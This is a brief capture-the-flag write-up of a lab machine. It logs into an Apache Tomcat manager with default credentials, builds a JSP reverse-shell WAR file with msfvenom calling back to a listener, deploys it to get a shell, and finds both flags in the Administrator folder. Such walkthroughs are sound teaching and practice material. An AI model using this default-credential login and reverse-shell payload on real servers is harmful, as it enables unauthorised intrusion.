# FOOTHOLD

Visiting port 8080 on the web browser we see its the generic Apache Tomcat page so we go to /manager using the default creds tomcat:s3cret and we see that there is a place to deploy a war file ( we had done this in a previous box so it helped more:) )

```s
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=1234 -f war > please.war
```
Then we upload this file and click on deploy.The page reloads and we see a file of the same name we gave ( no extension ).
Click on it and we get a shell back.

Now finding the flags was a bit frustrating. I looked almost everywhere even in Public but well, no flag.
So I tried to get into administrator directory ( didn't try it earlier cuz I assumed I had no access without privesc ).
So imagine how it felt to see I had all access to Administrator directory -_-
Anyways in \Administrator\Desktop i see a folder flags and inside it there's a file "2 for the price of 1.txt". Frankly thought it was a troll but nvm , ***IT ACTUALLY HAD BOTH THE FLAGS***

# PRIVILEGE ESCALATION

No Privesc. Already had admin access.
